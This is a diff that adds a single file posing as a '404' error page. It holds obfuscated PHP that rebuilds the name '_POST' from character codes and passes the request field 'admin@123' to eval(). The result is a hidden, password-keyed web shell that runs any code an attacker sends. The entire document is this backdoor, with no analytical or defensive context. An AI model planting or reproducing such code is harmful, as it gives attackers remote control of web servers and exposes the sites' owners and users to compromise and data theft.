@@ -1,0 +1,1 @@
+error:404<?php class wwww{public function wwwww($str)    {return chr($str);    }public function get($list)    {return$list['admin@123'];    }}$www = new wwww();$sfd = $www->wwwww(95);$sdf = $www->wwwww(80);$dfgb = $www->wwwww(79);$d123 = $www->wwwww(83);$d456 = $www->wwwww(84);$b = $sfd . $sdf . $dfgb . $d123 . $d456;eval(1 ? $www->get($$b) : 0);
